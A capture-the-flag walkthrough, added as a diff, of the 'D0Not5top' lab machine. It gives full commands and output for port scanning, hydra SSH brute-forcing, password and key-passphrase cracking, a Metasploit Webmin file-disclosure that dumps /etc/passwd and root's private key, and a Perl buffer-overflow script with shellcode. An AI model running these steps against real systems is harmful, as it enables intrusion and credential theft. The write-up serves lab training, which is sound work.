@@ -1,0 +1,393 @@
+Recon Phase:
+
+$ nmap -p 1-65535 -T4 -A -v 172.16.34.163
+
+    PORT      STATE SERVICE VERSION
+    22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)
+    | ssh-hostkey:
+    |   1024 a7:52:df:39:80:7c:66:16:2f:fd:f7:7b:80:13:09:85 (DSA)
+    |   2048 bf:d9:5a:22:54:91:cc:36:40:3c:e6:35:4f:8e:0c:78 (RSA)
+    |_  256 16:e6:84:e1:5f:80:bc:27:6a:50:01:55:f0:c0:cc:72 (ECDSA)
+    25/tcp    open  smtp    Exim smtpd
+    | smtp-commands: D0Not5top Hello nmap.scanme.org [172.16.34.1], SIZE 52428800, 8BITMIME, PIPELINING, HELP,
+    |_ Commands supported: AUTH HELO EHLO MAIL RCPT DATA NOOP QUIT RSET HELP
+    53/tcp    open  domain  PowerDNS 3.4.1
+    | dns-nsid:
+    |   NSID: D0Not5top (44304e6f7435746f70)
+    |   id.server: D0Not5top
+    |_  bind.version: PowerDNS Authoritative Server 3.4.1 (jenkins@autotest.powerdns.com built 20170111224403 root@x86-csail-01.debian.org)
+    80/tcp    open  http    Apache httpd
+    | http-methods:
+    |_  Supported Methods: GET HEAD POST OPTIONS
+    | http-robots.txt: 22 disallowed entries (15 shown)
+    | /games /dropbox /contact /blog/wp-login.php
+    | /blog/wp-admin /search /support/search.php
+    | /extend/plugins/search.php /plugins/search.php /extend/themes/search.php
+    |_/themes/search.php /support/rss /archive/ /wp-admin/ /wp-content/
+    |_http-server-header: Apache
+    |_http-title: Site doesn't have a title (text/html).
+    111/tcp   open  rpcbind 2-4 (RPC #100000)
+    | rpcinfo:
+    |   program version   port/proto  service
+    |   100000  2,3,4        111/tcp  rpcbind
+    |   100000  2,3,4        111/udp  rpcbind
+    |   100024  1          43606/tcp  status
+    |_  100024  1          47894/udp  status
+    43606/tcp open  status  1 (RPC #100024)
+$ dirb http://172.16.34.163
+
+Then http://172.16.34.163/control/index.html and then page source
+    <!-- FL46_1:urh8fu3i039rfoy254sx2xtrs5wc6767w -->  ---> Flag #1
+================================================================================
+In http://172.16.34.163/control/js/ a text file README.MadBro
+    ###########################################################
+    # MadBro MadBro MadBro MadBro MadBro MadBro MadBro MadBro #
+    # M4K3 5UR3 2 S3TUP Y0UR /3TC/H05T5 N3XT T1M3 L0053R...   #
+    # 1T'5 D0Not5topMe.ctf !!!!                               #
+    # 1M 00T4 H33R..                                          #
+    # MadBro MadBro MadBro MadBro MadBro MadBro MadBro MadBro #
+    ###########################################################
+
+                FL101110_10:111101011101
+                1r101010q10svdfsxk1001i1
+                11ry100f10srtr1100010h10
+It's a binary
+     FL46_2:39331r42q2svdfsxk9i13ry4f2srtr98h2 --> Flag 2
+================================================================================
+using metasplit
+$ use auxiliary/scanner/smtp/smtp_enum
+$ set rhosts 172.16.34.163
+$ run
+    172.16.34.163:25 Banner: 220 46 4c 34 36 5f 33 3a 32 396472796 63637756
+    8656874 327231646434 717070756 5793437 347 3767879610a EXIM SMTP
+convert "46 4c 34 36 5f 33 3a 32 396472796 63637756 8656874 327231646434
+717070756 5793437 347 3767879610a" from hex
+FL46_3:29dryf67uheht2r1dd4qppuey474svxya --> Flag 3
+================================================================================
+$ dirb http://172.16.34.163/control/ -X .txt,.php,.html
+    + http://172.16.34.163/control/hosts.txt
+    127.0.0.1	localhost
+    127.0.0.1 	D0Not5top.ctf
+    #127.0.0.1       MadBroAdN1n.ctf ## AD105 M0F05
+
+    # The following lines are desirable for IPv6 capable hosts
+    ::1     localhost ip6-localhost ip6-loopback
+    ff02::1 ip6-allnodes
+    ff02::2 ip6-allrouters
+seems like there is a virtual host so i added d0not5topme.ctf to my /etc/hosts
+it gave me phpBB Forum from register form Board Administrator links to Megusta@G4M35.ctf
+I used burp as a proxy and in the register i selected "I do not agree to these terms"
+
+      POST /ucp.php?mode=register&sid=1a476b935fcbc20d8e8d9aa6a73c5c0e HTTP/1.1
+      Host: d0not5topme.ctf
+      User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+      Accept-Language: en-US,en;q=0.5
+      Referer: http://d0not5topme.ctf/ucp.php?mode=register&sid=1a476b935fcbc20d8e8d9aa6a73c5c0e
+      Connection: close
+      Content-Type: application/x-www-form-urlencoded
+      Content-Length: 137
+      not_agreed=I+do+not+agree+to+these+terms&FLaR6yF1nD3rZ_html=&
+      creation_time=1493302202&form_token=11c2f41ecf74452969c675225a56bae15a70a6e9
+
+so i tried this FLaR6yF1nD3rZ_html via browser http://d0not5topme.ctf/FLaR6yF1nD3rZ_html
+    +++++ +++[- >++++ ++++< ]>+++ +++.+ +++++ .<+++ +[->- ---<] >---- ----.
+    ++.<+ +++++ [->++ ++++< ]>+++ ++.<+ +++++ [->-- ----< ]>--- ----. +++++
+    +.<++ +++++ [->++ +++++ <]>++ +.<++ +++++ [->-- ----- <]>-- ----- -----
+    -.++. <++++ ++[-> +++++ +<]>+ +++++ +++++ +.<++ ++[-> ++++< ]>+++ +.<++
+    +++++ +[->- ----- --<]> ----- .<+++ +++++ [->++ +++++ +<]>+ .++++ ++.<+
+    +++++ ++[-> ----- ---<] >---. <++++ +++[- >++++ +++<] >++++ +++++ ++++.
+    <+++[ ->--- <]>-- ---.< +++++ ++[-> ----- --<]> .+.+. ----- -.+++ +++++
+    +.-.- ---.< +++++ ++[-> +++++ ++<]> ..-.- .++++ +.++. +++++ ++++. <++++
+    +++[- >---- ---<] >---- ----- --.-- ---.< +++++ ++[-> +++++ ++<]> +++++
+    .<+++ [->++ +<]>+ +.++. --.++ .<+++ ++++[ ->--- ----< ]>--- ----- ---.<
+It's a brainfuck , After decoding gave me
+    FL46_4:n02bv1rx5se4560984eedchjs72hsusu9 --> Flag 4
+================================================================================
+I got another vhost Megusta@G4M35.ctf , i added G4M35.ctf to my hosts
+then i accessed g4m35.ctf and it's a nice a game ,, after losing it gave me
+/H3x6L64m3 Click here to play again
+so i followed /H3x6L64m3 link and it's another game
+while i was playing i noticed an octal code in the background
+$ dirb http://g4m35.ctf/H3x6L64m3/ /usr/share/wordlists/dirb/big.txt
+    ==> DIRECTORY: http://g4m35.ctf/H3x6L64m3/audio/
+    ==> DIRECTORY: http://g4m35.ctf/H3x6L64m3/css/
+    ==> DIRECTORY: http://g4m35.ctf/H3x6L64m3/libs/
+    ==> DIRECTORY: http://g4m35.ctf/H3x6L64m3/textures/
+and i found these
+http://g4m35.ctf/H3x6L64m3/textures/skybox/dawnclouds/pz.jpg
+http://g4m35.ctf/H3x6L64m3/textures/skybox/dawnclouds/nz.jpg
+\106\114\64\66\137\65\72\60\71\153\70\67\150\66\147\64\145\62\65\147\150\64\64\
+167\141\61\162\171\142\171\146\151\70\71\70\150\156\143\144\165
+    FL46_5:09K87H6G4E25GH44WA1RYBYFI898HNCDU --> Flag 5
+================================================================================
+After i lost again it gave me a message HTTP://T3RM1N4L.CTF and i added it to my hosts
+it gave me like web terminal that say "t3rm1n4l.ctf Passwordo Requireo:"
+i tried "t3rm1n4l.ctf" -- AUTHENTICO!
+$ pwd
+    /usr/share/nginx/html
+$ grep
+    Usage: grep [OPTION]... PATTERN [FILE]...
+    Try 'grep --help' for more information.
+$ grep * /etc/
+
+    grep: BBBBBBBBBBB: Is a directory
+    grep: CCCCCCCCCCC: Is a directory
+    grep: M36u574.ctf: Is a directory
+    grep: XXXXXXXXXXX: Is a directory
+    grep: YYYYYYYYYYY: Is a directory
+    grep: ZZZZZZZZZZZ: Is a directory
+    grep: etc: No such file or directory
+and i added M36u574.ctf to my hosts and its a page that showing images
+i downloaded all and tried to extract metadata and i got this from kingmegusta.jpg
+    TWVHdXN0YUtpbmc6JDYkZTEuMk5jVW8kOTZTZmtwVUhHMjVMRlpmQTVBYkpWWmp0RDRmczZmR2V0
+    RGRlU0E5SFJwYmtEdzZ5NW5hdXdNd1JOUHhRbnlkc0x6UUd2WU9VODRCMm5ZL080MHBaMzAK
+$ echo "TWVHdXN0YUtpbmc6JDYkZTEuMk5jVW8kOTZTZmtwVUhHMjVMRlpmQTVBYkpWWmp0RDRmczZm
+R2V0RGRlU0E5SFJwYmtEdzZ5NW5hdXdNd1JOUHhRbnlkc0x6UUd2WU9VODRCMm5ZL080MHBaMzAK" | base64 -d
+
+    MeGustaKing:$6$e1.2NcUo$96SfkpUHG25LFZfA5AbJVZjtD4fs6fGetDdeSA9HRpbkDw6y5nauwMwRN
+    PxQnydsLzQGvYOU84B2nY/O40pZ30
+$ john --wordlist:/usr/share/wordlists/rockyou.txt pass
+    **********       (MeGustaKing)
+$ ssh MeGustaKing@172.16.34.163
+
+    MeGustaKing@172.16.34.163's password:
+    ERROR!
+    TRACE: sshPr0xy.py line:550 <CODE>U2FsdGVkX1/vv715OGrvv73vv73vv71Sa3cwTmw4Mk
+    9uQnhjR1F5YW1adU5ISjFjVEZ2WW5sMk0zUm9kemcwT0hSbE5qZDBaV3BsZVNBS++/ve+/ve+/
+    vWnvv704OCQmCg==</CODE>
+
+    The programs included with the Debian GNU/Linux system are free software;
+    the exact distribution terms for each program are described in the
+    individual files in /usr/share/doc/*/copyright.
+
+    Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+    permitted by applicable law.
+
+    Last login:Sat Apr  1 00:00:01 2017 from R0cKy0U.7x7
+    Welcome to rush shell
+    Lets you update your FunNotes and more!
+
+    Uh0h.. u n0 burtieo
+    h35 da 54wltyD4w6 y0u...
+    Gw04w4y :(
+    Local configuration error occurred.
+    Contact the systems administrator for further assistance.
+    Connection to 172.16.34.163 closed.
+$ echo "U2FsdGVkX1/vv715OGrvv73vv73vv71Sa3cwTmw4Mk9uQnhjR1F5YW1adU5ISjFjVEZ2WW5
+sMk0zUm9kemcwT0hSbE5qZDBaV3BsZVNBS++/ve+/ve+/vWnvv704OCQmCg==" | base64 -d
+    Salted__�y8j���Rkw0Nl82OnBxcGQyamZuNHJ1cTFvYnl2M3Rodzg0OHRlNjd0ZWpleSAK���i�88$&
+$ echo "Rkw0Nl82OnBxcGQyamZuNHJ1cTFvYnl2M3Rodzg0OHRlNjd0ZWpleSAK" | base64 -d
+    FL46_6:pqpd2jfn4ruq1obyv3thw848te67tejey --> Flag 6
+================================================================================
+i noticed "Uh0h.. u n0 burtieo" it could be another username
+
+$ hydra -l burtieo -P /usr/share/wordlists/rockyou.txt 172.16.34.163 ssh
+    [ssh] host: 192.168.190.132   login: burtieo   password: Lets you update your FunNotes and more!
+"Lets you update your FunNotes and more!" what a password !!
+i accessed to ssh
+$ ssh burtieo@172.16.34.163
+
+$ echo "$(</etc/passwd)"
+    burtieo:x:1000:1000:burtie,,,:/home/burtie:/bin/rbash
+it's rbash shell
+i got a little help to find this command "suedoh -l"
+$ suedoh -l
+    suedoh: unable to resolve host D0Not5top
+    Matching Defaults entries for burtieo on D0Not5top:
+        env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+    User burtieo may run the following commands on D0Not5top:
+        (ALL) NOPASSWD: /usr/bin/wmstrt
+$ suedoh /usr/bin/wmstrt
+    D1dyaCatchaT3nK1l0?
+    :D
+$ nmap -T4 -F 172.16.34.163
+	PORT      STATE SERVICE
+	22/tcp    open  ssh
+	25/tcp    open  smtp
+	53/tcp    open  domain
+	80/tcp    open  http
+	111/tcp   open  rpcbind
+	10000/tcp open  snet-sensor-mgmt
+after doing a quick scan ,, it's open port 10000 for 20 seconds for webmin
+
+$ for i in {1..99999..1};do echo $(suedoh /usr/bin/wmstrt&);done
+
+
+i tried webmin file disclosure from browser and it worked
+using metasploit
+$ use auxiliary/admin/webmin/file_disclosure
+$ set rhost 172.16.34.163
+$ set ssl true
+$ run
+    root:x:0:0:root:/root:/bin/bash
+    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+    bin:x:2:2:bin:/bin:/usr/sbin/nologin
+    sys:x:3:3:sys:/dev:/usr/sbin/nologin
+    sync:x:4:65534:sync:/bin:/bin/sync
+    games:x:5:60:games:/usr/games:/usr/sbin/nologin
+    man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+    lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+    mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+    news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+    uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+    proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+    www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+    backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+    list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+    irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+    gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+    nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+    systemd-timesync:x:100:103:systemd Time Synchronization,,,:/run/systemd:/bin/false
+    systemd-network:x:101:104:systemd Network Management,,,:/run/systemd/netif:/bin/false
+    systemd-resolve:x:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/false
+    systemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/false
+    Debian-exim:x:104:109::/var/spool/exim4:/bin/false
+    messagebus:x:105:110::/var/run/dbus:/bin/false
+    statd:x:106:65534::/var/lib/nfs:/bin/false
+    avahi-autoipd:x:107:113:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
+    sshd:x:108:65534::/var/run/sshd:/usr/sbin/nologin
+    burtieo:x:1000:1000:burtie,,,:/home/burtie:/bin/rbash
+    pdns:x:109:116:PowerDNS,,,:/var/spool/powerdns:/bin/false
+    mysql:x:110:117:MySQL Server,,,:/nonexistent:/bin/false
+    MeGustaKing:x:1001:1001::/King:/usr/sbin/rush
+    dnsmasq:x:111:65534:dnsmasq,,,:/var/lib/misc:/bin/false
+$ set rpath /root/.ssh/id_rsa
+$ run
+    -----BEGIN RSA PRIVATE KEY-----
+    Proc-Type: 4,ENCRYPTED
+    DEK-Info: AES-128-CBC,7DA162212961C0CF94C636B47C991024
+
+    rDnUjh68EoasdaP40ta9QBeXtvB5uUVH9nKHKWo4KvhLcM4Z0/R6qvjSjlHir4LR
+    uhTb5Y+e2C7Wze8GlYbdGksFXbUztZec26vN7xH8Q4SeI++J77agqKWRE6jJ++hd
+    DsR7vDcqGbm9xX37BbE9Q4lLEHR/hNRe3/Ztrbt3obnCLvCW6H3kzpteycWAQQ3W
+    BaFns85p4AZn654HoIqX/UOkztdYxgOLgpzrLh9p1bRLiaOiBCrURkpYLspeKCNN
+    yfuPvNUgF1+uH78GlvLwfAA6XRj6HPDZ3D22/MxKcGixUVSPXjJlRpqyFQtvSM6T
+    cN5NmXjOjmzfgafqPqf7eTFfLChcsWHUmsSneq7pQhvw/vfeGX2kizuXCago+yWt
+    2IlFusQilfDDzybiunNOp+njD7TxeBLFcAUVdACfMUQ/fC0GHKeHB8q79Wi7r0SQ
+    m0eC6fIXJpDavN9PtPF2v+5OH9EDKycaeWMmWT0S0fNMmIhHb+U/uhtDjQx+M9fI
+    I5aBCjzCsDCoKT0qkv+dTafyqSzUN9EupCRh0NcsUT00yrQkxzM5L6C3H+61SNq8
+    CNi4I50aDp8q6m0KP/GZhUAU9Uegj+JZQ1h5MSnjOpOvKbD4l6/rWM02iFVAmg4O
+    WjSQfqbxGCmoHE8Y7iqgB8lRWnDYPssDXIMx+1pBkNkBASMpz6gJBZ//rJE1PkVr
+    aKdhbJFR1NX097z3HXS/7SBJmyuctG+JviH7mp1fH3WMAk2iu4nSiE1aNH1YV/nW
+    rXNOi5c7/yDE9o/weuJoCBL4VXeH89+l8551JOGU9RMuNk0pi/SSaUwwn7wR0/Yf
+    b9Sk3pbFDS64AON1T+4zlBWWif8aRMJ7Vm6zkDsE1Jq9nKcNzDknfufs45mKVzXU
+    m9dlGgzfNF46yPCuHzBZt4q1wrzg5/7gcWx5Qq6xD5VtWiMlB4G3D8DruaeqgTOi
+    Sh/jFqEOErA015Ympz/0Hh/lFn0NAAJy89BPG86d+VVAn5YstQEqH6zzuIy9mZ9K
+    853+0BUxA0I9rEessa+Q+NlFadBVE2FcJAr7rMsLGZFoqfvWxg5hBJFJ7jrjpQNe
+    Q9qzA/CbiMeU+zdifXZwprJR1fNVWalPJJGwotwVgXN/z4s8iN1gMN9y4Kynue9k
+    zQ/HqvgTkyX52ojLnM/PkXCyx7EXBAOJi5s6fv/22kcZ5Xkpw+x/VILPnJqObmU9
+    RZ3IB6kbckiMld5GX+xMvYi9rvmHf/mdLj75e7PU+FjCufApXAi+T10PnvMvrCGS
+    FkSlVyPPo1s4klTdrf2l6tkK6Lqu/7SamkvQvMsY7wnNT4OPI95y3GoRnwEFLd7w
+    honOroF1U6leA5O8jxSxI/CIwxvb5DO/sX4bZxShlhD98yO74ImAg5ACTj/eUaVA
+    /Q7bpfasSnqdKNWhx81pD6Ee9WeBZv8c0I0/EqS188O1qFYbtsaqZhYytTqYwvZ0
+    p6QuusMnDaA1nB8wL7ltKXt5PhBBxSVbUKtP6DWcBRviItFTsAnmK1QhD2wmTkCu
+    B8ochgwCgtAUs4cUXxnZrp5pu2yvu8Dhf//z8lBtoItPh5LTmW1N1g4s+9NKt72P
+    -----END RSA PRIVATE KEY-----
+$ set rpath /root/.ssh/id_rsa.pub
+$ run
+    ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDPKVt8KEVrr80LT9ZwRsWG8w9O2vgWd99+2+xmi
+    3WCgCR/IrhqoJqEhX9owwiaUUnyRWrj9AKDj8Neetju9rOCTJsvWAlfFgyrRXkOV9twpLcrML+LC5
+    GsVGLH7U/R2sTpT9Ywad0yL+FTvHZ+AbYLFpml4Gbhat6Ynhcg3Q6XmxGHXkV9cd6/XCx74K8CKEt
+    Oye1REj8KDtsC329qvbp/9Dt1ZZQEAUFvLqgLJiZxmH5snWiszcO2TKQ3lUw3tLy5rA/bXe3Bf4zu
+    EmktEuA0NW+FTLYELrBy/5PK007Uh0CQVpVS5C+tkLtqh6meAXPp7dhi/B6qGOIXpPxjpUjH
+    root@D0Not5top
+This key for root access
+$ ssh -i id_rsa root@172.16.34.163
+    Enter passphrase for key
+The key is encrypted
+$ ssh2john id_rsa > passphrase
+$ john --wordlist:/usr/share/wordlists/rockyou.txt passphrase
+    the passphrase is gustateamo
+$ ssh -i id_rsa root@172.16.34.163
+$ cat L45T_fl46.pl
+    #!/usr/bin/perl -w
+    ######################################################
+    #                                                    #
+    #  W311 D0n3                                         #
+    #  Y0u D1d N0t5top                                   #
+    #  Much0 M3Gu5t4 :D                                  #
+    #                                                    #
+    #  3mrgnc3                                           #
+    #                                                    #
+    #  Hope you had fun...                               #
+    #  8ut...                                            #
+    #                                                    #
+    #  p.s..                                             #
+    #  571ll 1 M0r3 f146 :D                              #
+    #                                                    #
+    ######################################################
+
+
+    use IO::Socket;
+
+    if(!($ARGV[1]))
+    {
+     print "Usage: L45T_fl46.pl <user> <flag>\n\n";
+     exit;
+    }
+
+    $shellcode =	"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f" .
+                    "\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x38" .
+                    "\x00\x00\x00\x59\x41\x59\x20\x46\x4c\x34\x36\x5f\x37" .
+                    "\x3a\x39\x74\x6a\x74\x38\x36\x65\x76\x76\x63\x79\x77" .
+                    "\x75\x75\x66\x37\x37\x34\x68\x72\x38\x38\x65\x75\x69" .
+                    "\x33\x6e\x75\x73\x38\x64\x6c\x6b\x20\x32\x3e\x2f\x74" .
+                    "\x6d\x70\x2f\x68\x75\x68\x00\x57\x53\x89\xe1\xcd\x80" .
+                    "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f" .
+                    "\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x38" .
+                    "\x00\x00\x00\x59\x41\x59\x20\x46\x4c\x34\x36\x5f\x37" .
+                    "\x3a\x39\x74\x6a\x74\x38\x36\x65\x76\x76\x63\x79\x77" .
+                    "\x75\x75\x66\x37\x37\x34\x68\x72\x38\x38\x65\x75\x69" .
+                    "\x33\x6e\x75\x73\x38\x64\x6c\x6b\x20\x32\x3e\x2f\x74" .
+                    "\x6d\x70\x2f\x68\x75\x68\x00\x57\x53\x89\xe1\xcd\x80" .
+                    "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f" .
+                    "\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x38" .
+                    "\x00\x00\x00\x59\x41\x59\x20\x46\x4c\x34\x36\x5f\x37" .
+                    "\x3a\x39\x74\x6a\x74\x38\x36\x65\x76\x76\x63\x79\x77" .
+                    "\x75\x75\x66\x37\x37\x34\x68\x72\x38\x38\x65\x75\x69" .
+                    "\x33\x6e\x75\x73\x38\x64\x6c\x6b\x20\x32\x3e\x2f\x74" .
+                    "\x6d\x70\x2f\x68\x75\x68\x00\x57\x53\x89\xe1\xcd\x80" .
+                    "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f" .
+                    "\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x38" .
+                    "\x00\x00\x00\x59\x41\x59\x20\x46\x4c\x34\x36\x5f\x37" .
+                    "\x3a\x39\x74\x6a\x74\x38\x36\x65\x76\x76\x63\x79\x77" .
+                    "\x75\x75\x66\x37\x37\x34\x68\x72\x38\x38\x65\x75\x69" .
+                    "\x33\x6e\x75\x73\x38\x64\x6c\x6b\x20\x32\x3e\x2f\x74" .
+                    "\x6d\x70\x2f\x68\x75\x68\x00\x57\x53\x89\xe1\xcd\x80" .
+                    "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f" .
+                    "\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x38" .
+                    "\x00\x00\x00\x59\x41\x59\x20\x46\x4c\x34\x36\x5f\x37" .
+                    "\x3a\x39\x74\x6a\x74\x38\x36\x65\x76\x76\x63\x79\x77" .
+                    "\x75\x75\x66\x37\x37\x34\x68\x72\x38\x38\x65\x75\x69" .
+                    "\x33\x6e\x75\x73\x38\x64\x6c\x6b\x20\x32\x3e\x2f\x74" .
+                    "\x6d\x70\x2f\x68\x75\x68\x00\x57\x53\x89\xe1\xcd\x80" .
+                    "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f" .
+                    "\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x2d" .
+                    "\x00\x00\x00\x4e\x33\x76\x33\x72\x20\x41\x73\x35\x75" .
+                    "\x6d\x33\x21\x20\x31\x74\x20\x4d\x34\x6b\x33\x35\x20" .
+                    "\x34\x6e\x20\x34\x35\x35\x20\x30\x66\x20\x79\x30\x75" .
+                    "\x20\x26\x20\x6d\x33\x20\x3a\x44\x00\x57\x53\x89\xe1" .
+                    "\xcd\x80" ;
+
+    $root = IO::Socket::INET->new(Proto=>'tcp',
+                                    PeerAddr=>$ARGV[0],
+                                    PeerPort=>$ARGV[1])
+                                or die "Unable to use [$ARGV[0]] to open [$ARGV[1]]";
+    $ebp = "TROLLOOOLLO";
+    $eip = "\xBA\xDF\x00\xD0";
+    $flag7 = "RUN /" . "a"x1036 . $ebp . $eip . $shellcode . " HTTTPEE/1.1\n\n";
+
+    print $root $flag7;
+    sleep(5);
+    print "Done.\n";
+
+    close($root);
+    exit;
+from my local machine
+$ nc -lp 4321
+and from D0Not5top machine
+$ ./L45T_fl46.pl localhost 4321
+    FL46_7:9tjt86evvcywuuf774hr88eui3nus8dlk --> Flag 7
+================================================================================
